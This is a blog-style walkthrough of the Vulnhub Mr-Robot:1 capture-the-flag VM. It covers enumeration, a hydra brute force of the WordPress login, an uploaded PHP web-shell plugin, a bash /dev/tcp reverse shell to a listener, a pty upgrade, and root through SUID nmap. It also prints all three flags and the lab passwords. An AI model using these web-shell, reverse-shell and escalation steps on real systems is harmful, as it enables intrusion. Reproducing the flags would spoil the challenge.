@@ -1,0 +1,380 @@
+---
+title: "Mr-Robot:1 ~ Writeup"
+publishedAt: "2016-07-12"
+summary: "Writeup of Vulnhub's Mr-Robot:1 CTF challenge."
+---
+
+![Our Democracy Has Been Hacked](/static/images/mr-robot-1-writeup/our-democracy-has-been-hacked.jpg)
+
+- Type: Boot2Root
+- Level: Begginer-Intermediate
+- Creator: [@Jason](https://www.vulnhub.com/author/jason,292/)
+- Host: [Vulnhub.com](https://vulnhub.com)
+- Link: [Download Here](https://www.vulnhub.com/entry/mr-robot-1,151/)
+
+## Brief Description
+
+**Mr-Robot: 1** is one of vulnhub's CTF challenges, based on the favored TV series "Mr. Robot" (which is, by the way, premiering season 2 Wednesday July 13th). There are apparently 3 hidden keys in the VM. Our objective is to locate all 3 keys.
+
+![Mr Robot](/static/images/mr-robot-1-writeup/mr-robot.gif)
+
+## Let The Hacking Begin!
+
+It goes without saying that we'll start off with a classic `nmap` scan so as to locate our target's IP address and open ports.
+
+> `root@kali:~# nmap -sV -sS 10.10.200.*`
+
+```bash
+Nmap scan report for linux (10.10.200.31)
+Host is up (0.00030s latency).
+Not shown: 997 filtered ports
+PORT    STATE  SERVICE  VERSION
+22/tcp  closed ssh
+80/tcp  open   http     Apache httpd
+443/tcp open   ssl/http Apache httpd
+MAC Address: 08:00:27:82:32:61 (Oracle VirtualBox virtual NIC)
+```
+
+There we go. We found both our IP and accessible ports. 
+
+Apparently, ports **80** and **443** are open. Let's fire up our browser!
+
+![Website](/static/images/mr-robot-1-writeup/website.png)
+
+The website seems to be very well made, with some *real* JavaScript. Pretty cool I must admit. Now let's hack into it!
+
+## KEY-1-OF-3
+
+We'll try some basics first. How about checking out for a `robots.txt` file?
+
+```bash
+User-agent: *
+fsocity.dic
+key-1-of-3.txt
+```
+
+BOOM! We just uncovered a dictionary as well as our first key, without even using our cli. Great!
+
+> `http://TARGET_IP/key-1-of-3.txt`
+
+```bash
+073403c8a58a1f80d943455fb30724b9
+```
+
+Let's save our key and continue hunting. We can use some `wget` magic to download our dictionary file. We'll most probably need it later on.
+
+> `root@kali:~# wget http://10.10.200.31/fsocity.dic`
+
+At this stage, we can use our friend `dirb` so as to uncover any other hidden directories and files. 
+
+> `root@kali:~# dirb http://TARGET_IP/`
+
+```bash
+...
++ http://10.10.200.31/sitemap (CODE:200|SIZE:0)                                
++ http://10.10.200.31/sitemap.xml (CODE:200|SIZE:0)                            
+==> DIRECTORY: http://10.10.200.31/video/                                      
+==> DIRECTORY: http://10.10.200.31/wp-admin/                                   
++ http://10.10.200.31/wp-config (CODE:200|SIZE:0)
+...
+```
+
+Nice! It seems that we're going to be dealing with some WordPress authentication bruteforce (`/wp-admin/`).
+
+![WordPress Login](/static/images/mr-robot-1-writeup/wp-login.png)
+
+The error message we get once we enter invalid credentials is `ERROR: Invalid username`. So if we find a valid username, a different error message will be displayed.
+
+Let's see if we can take advantage of that and manually guess a username to save us some time. How about *Elliot*...? Yes! Another ace! (You can also bruteforce it if you don't like guessing.)
+
+All we need to do now is use a tool like `hydra` or `burpsuite` to bruteforce the login form with the `fsocity.dic` file we saved previously. Easy.
+
+It seems that the dictionary consists of 858,160 possible passwords in total. It will definitely take time. 
+
+> `root@kali:~# wc -l fsocity.dic`
+
+```bash
+858160 fsocity.dic
+```
+
+We can run a `sort uniq` command just to make sure that there aren't any duplicates in our file. As they say, "always trust your gut". 
+
+> `root@kali:~# sort fsocity.dic | uniq > sorted.dic`
+
+> `root@kali:~# wc -l sorted.dic`
+
+```bash
+11451 sorted.dic
+```
+
+YES! We are down to 11,451 different passes. Certainly saved us some (loads of) time.
+
+It's finally time to commence our bruteforce attack. Open up your most preferred tool and get going. Since I only have the free version of `burpsuite`, which is *significantly* slow, I'll use `hydra`.
+
+> `root@kali:~# hydra 10.10.200.31 http-form-post "/wp-login.php:log=^USER^&pwd=^PASS^:incorrect" -l Elliot -P sorted.dic -t 10 -w 30`
+
+```bash
+Hydra (http://www.thc.org/thc-hydra) starting at 2016-07-11 10:43:52
+[DATA] max 10 tasks per 1 server, overall 64 tasks, 11452 login tries (l:1/p:11452), ~17 tries per task
+[DATA] attacking service http-post-form on port 80
+[80][http-post-form] host: 10.10.200.31   login: Elliot   password: ER28-0652
+1 of 1 target successfully completed, 1 valid password found
+Hydra (http://www.thc.org/thc-hydra) finished at 2016-07-11 10:43:55
+```
+
+Bullseye! We just gained access to the WordPress platform, with the username **Elliot** and the password **ER28-0652**! Now we'll need to find a way to gain access to the shell. Let's go!
+
+After thinking through my options, I thought it would be painless to create a dead simple plugin which could be used to execute shell commands and thus give us our reverse shell. (You could equally use a php reverse shell script to achieve the same goal; I personally prefer doing it the 'hard', manual way.)
+
+All I need to do is add some typical WordPress plugin info in the beginning of the php file, followed by a php single liner, and we're all set.
+
+```php
+<?php
+/*
+Plugin Name: Shell
+Plugin URI: https://nikolaskama.me/
+Description: Allows me to own you;)
+Author: k4m4
+Version: 1.0.0
+Author URI: https://nikolaskama.me/
+*/
+
+echo shell_exec($_GET['e']);
+```
+
+This file is everything we need at this point. We simply have to upload it to the WordPress platform as a new plugin, by navigating to `Plugins > Add New > Upload Plugin`, and then dragging and dropping the file in `zip`, compressed format. You can install the complete file from [here](https://www.dropbox.com/s/7fr9nbfb4rdxgat/shell.php.zip?dl=0).
+
+Once the plugin is successfully installed, you should see this in your browser:
+
+```bash
+Installing Plugin from uploaded file: shell.php.zip
+
+Unpacking the package…
+
+Installing the plugin…
+
+Plugin installed successfully.
+```
+
+Next, you must activate the plugin by selecting `Activate Plugin`.
+
+If everything is correctly done, we should now be able to execute commands through our url bar! Let's give it a shot! Enter the following in your browser's url:
+
+> `http://TARGET_IP/wp-content/plugins/shell.php_/shell.php?e=whoami`
+
+![whoami](/static/images/mr-robot-1-writeup/whoami_daemon.png)
+
+Excellent! It works perfectly! Use your browser's *view page source* to be able to clearly see the result. (It should be at the very top of the page - ignore the rest.)
+
+As you can see, we are able to run commands as `daemon`. We now gotta find a way to get reverse shell.
+
+Looking around, a `ls -la` command returned an unusual file named `you-will-never-guess-this-file-name.txt`, intriguing me. I opened up the plaintext file, and all I got was `hello there person who found me`. No luck. I have to try something different.
+
+I tried running a pure bash reverse shell command, and at that point, I realized that some characters ("&" and ">" in this instance) must be encoded in order to avoid execution errors. 
+ 
+I appropriately encoded the two characters using an online encoder, resulting to `%3E%26`. Subsequently, I saved the command with the encoded characters into a file I specified as `reversed.txt` in the `/tmp/` directory. 
+
+The encoded command goes as follows:
+> `http://TARGET_IP/wp-content/plugins/shell.php_/shell.php?e=/bin/echo "/bin/bash -i %3E%26 /dev/tcp/LISTENER_IP/443 0%3E%261" > /tmp/reverse.txt`
+
+By writing the reverse command inside a file, we make our lives easier, since we don't overcomplicate the actual execution command - something that will often result to error.
+
+The `/tmp/` directory will nearly always have read, write, and execute privileges, meaning that we will be able to execute our malicious file through that specific directory.
+
+However, once we create the file we only grant it read permissions:
+
+```bash
+-rw-r--r-- 1 daemon daemon 47 Jul 12 16:37 /tmp/reverse.txt
+```
+
+So, in order for us to be able to run it, we must change the file's permissions, and allow execution with the `chmod 777` standard command.
+
+> `http://TARGET_IP/wp-content/plugins/shell.php_/shell.php?e=chmod 777 /tmp/reverse.txt`
+
+```
+-rwxrwxrwx 1 daemon daemon 47 Jul 12 11:52 /tmp/reverse.txt
+```
+
+Done! 
+
+I will now use `netcat`, in my kali 2 VM, to listen on port 443.
+
+> `root@kali:~# nc -vlp 443`
+
+All that's left to do at this moment is run the file. So without any further ado, let's get going! 
+
+We must now use `bash` to execute the command, while `netcat` is running in the background.
+
+> `http://TARGET_IP/wp-content/plugins/shell.php_/shell.php?e=/bin/bash /tmp/reverse.txt/`
+
+Once you have finally executed the command, navigate to your listening terminal. 
+
+```bash
+10.10.200.31: inverse host lookup failed: Unknown host
+connect to [10.10.200.26] from (UNKNOWN) [10.10.200.31] 43420
+bash: cannot set terminal process group (11139): Inappropriate ioctl for device
+bash: no job control in this shell
+
+daemon@linux:/opt/bitnami/apps/wordpress/htdocs$
+```
+
+Woo-hoo! We have full shell access!
+
+Nevertheless, if you run a `whoami` command, you will realize that we are still far behind, considering that we're still running as `daemon`.
+
+## KEY-2-OF-3
+
+Let's take a look at the other users available.
+
+> `daemon@linux:/opt/bitnami/apps/wordpress/htdocs$ cat /etc/passwd`
+
+```bash
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+...
+syslog:x:101:104::/home/syslog:/bin/false
+sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin
+ftp:x:103:106:ftp daemon,,,:/srv/ftp:/bin/false
+bitnamiftp:x:1000:1000::/opt/bitnami/apps:/bin/bitnami_ftp_false
+mysql:x:1001:1001::/home/mysql:
+varnish:x:999:999::/home/varnish:
+robot:x:1002:1002::/home/robot:
+```
+
+Hm... Interesting. It seems that there's a `robot` user. Let's navigate to his directory to see if there's anything exciting there.
+
+> `daemon@linux:/opt/bitnami/apps/wordpress/htdocs$ cd /home/robot`
+> `daemon@linux:/home/robot$ ls -la`
+
+```bash
+...
+-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
+-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
+```
+
+Fabulous! We have found our second key as well as a password hash which we'll obviously need at some point!
+
+Let's save the key and see if we can make any use of the md5 password now.
+
+> `daemon@linux:/home/robot$ cat 2-of-3.txt`
+
+```bash
+cat: key-2-of-3.txt: Permission denied
+```
+
+Actually, it turns out that we can't save the key since we don't have permission to even read the file it's stored in.
+
+> `daemon@linux:/home/robot$ cat password.raw-md5 `
+
+```bash
+robot:c3fcd3d76192e4007dfb496cca67e13b
+```
+
+However, I do in fact have access to the md5 file. It appears to be the password for the user `robot` which will most likely lead us to the key.
+
+Let's use our best friend `google` to see if we can find the base10 password, hidden behind the hash.
+
+And of course, google gave us the answer. (You could also use `hashcat` or any other cracking tool if you'd like, instead.) The password is simply the english alphabet. 
+
+![MD5 Decrypted Hash](/static/images/mr-robot-1-writeup/md5_hash.png)
+
+Now, let's try to login as `robot` with the password we found.
+
+> `daemon@linux:/home/robot/$ su robot`
+
+```bash
+su: must be run from a terminal
+```
+
+Darn! We got an unexpected error. Don't worry falks! I've got the solution in my pocket. Just run these two simple commands and python will get the job done!
+
+> `daemon@linux:/home/robot/$ echo "import pty; pty.spawn('/bin/bash')" > /tmp/asdf.py`
+
+> `daemon@linux:/home/robot/$ python /tmp/asdf.py`
+
+This error occurred because of the absence of a TTY, but now we're set. Let's give it another shot.
+
+> `daemon@linux:/home/robot/$ su robot`
+
+Once we enter the password `abcdefghijklmnopqrstuvwxyz`, we should be in!
+
+> `robot@linux:~$ id`
+
+```bash
+uid=1002(robot) gid=1002(robot) groups=1002(robot)
+```
+
+Perfect. As you can see, we are now logged in as `robot`.
+
+> `robot@linux:~$ cat key-2-of-3.txt`
+
+```
+822c73956184f694993bede3eb39f959
+```
+
+And here's our second key! Brilliant!
+
+## KEY-3-OF-3
+
+Now for the more challenging part... we must find a way to `root`. Let's initially consider our options.
+
+First, we can use `ps axuw` to see if we can take advantage of any commands that had been executed in the past.
+
+Nothing out of the ordinary.
+
+What about SUID files? Let's see.
+
+> `robot@linux:~$ find / -user root -perm -4000 -exec ls -ldb {} \; | grep -v proc`
+
+```bash
+...
+-rwsr-xr-x 1 root root 155008 Mar 12  2015 /usr/bin/sudo
+-rwsr-xr-x 1 root root 504736 Nov 13  2015 /usr/local/bin/nmap
+-rwsr-xr-x 1 root root 440416 May 12  2014 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root 10240 Feb 25  2014 /usr/lib/eject/dmcrypt-get-device
+...
+```
+
+`Nmap` seems to be installed in the VM. Terrific! This can be our way to `root`. Let's try running the commands which should do the trick:
+
+> `robot@linux:~$ nmap --interactive`
+
+```bash
+Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
+Welcome to Interactive Mode -- press h <enter> for help
+```
+
+Nmap's Interactive Mode should work! Let's see!
+
+> `nmap> !sh`
+
+> `# id`
+
+```bash
+uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
+```
+
+AWESOME! We can now execute commands as root!!! It wasn't so demanding after all.
+
+> `# cd /root/`
+
+> `# cat key-3-of-3.txt`
+
+```bash
+04787ddef27c3dee1ee161b21670b4e4
+```
+
+And here's our last key! 3/3!
+
+You have pretty much reached the end of this writeup! I hope you've enjoyed my walkthrough on this compelling challenge. In fact, it turns out to be my very first! I have attempted to include some brief explanations of the steps I took to reach this final flag. If you have any feedback, I will be more than happy to hear from you! So don't hesitate to email me at **nikolaskam{at}gmail{dot}com**.
+
+Stay tuned for similar walkthroughs and much more coming up in the near future!
+
+&#9889; **k4m4** from 127.0.0.1
+
+![FSociety Outro](/static/images/mr-robot-1-writeup/fsociety_outro.gif)
+
+- Post Image by [Alisa Vysochina](https://dribbble.com/shots/2255868-Mr-Robot)
+- Our Democracy Image from [NBCUniversalStore](https://www.nbcuniversalstore.com/)
+- Mr Robot Gif by [Matthew Butler](https://dribbble.com/ButlerM)
+- Fsociety Outro Gif by [WhoIsMrRobot](https://www.wattpad.com/user/whoismrrobot) [edited]
